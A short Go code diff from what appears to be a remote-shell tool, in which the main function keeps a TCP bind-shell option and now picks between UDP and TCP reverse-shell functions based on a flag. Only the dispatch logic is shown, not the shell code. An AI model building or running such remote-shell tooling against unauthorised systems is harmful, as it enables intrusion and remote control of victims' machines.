@@ -41,6 +41,10 @@ func main() {
 			TCPBind(config)
 		}
 	} else {
-		ReverseShell(config)
+		if udp {
+			UDPReverseShell(config)
+		} else {
+			TCPReverseShell(config)
+		}
 	}
 }
